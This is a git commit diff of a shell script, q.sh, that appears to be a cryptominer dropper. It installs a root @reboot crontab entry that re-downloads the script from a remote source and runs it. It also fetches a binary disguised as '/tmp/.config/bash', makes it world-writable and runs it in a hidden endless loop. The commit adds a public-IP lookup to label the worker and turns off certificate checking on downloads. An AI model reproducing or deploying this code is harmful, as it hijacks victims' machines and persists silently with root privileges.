a82def5bbb67d0544d47d1e121c58112669ba6fe
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-01 17:06:42 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -8,14 +8,16 @@ sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy instal
 
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
-name="Cli_${cores}.sh"
+addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
+[ -n "$addr" ] || addr="NULL"
+name="c${cores}_${addr}"
 
 sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1
 sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 mkdir -p "/tmp/.config"
-wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
-wget -qO "/tmp/.config/bash" "${src}/q"
+wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
 
 bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
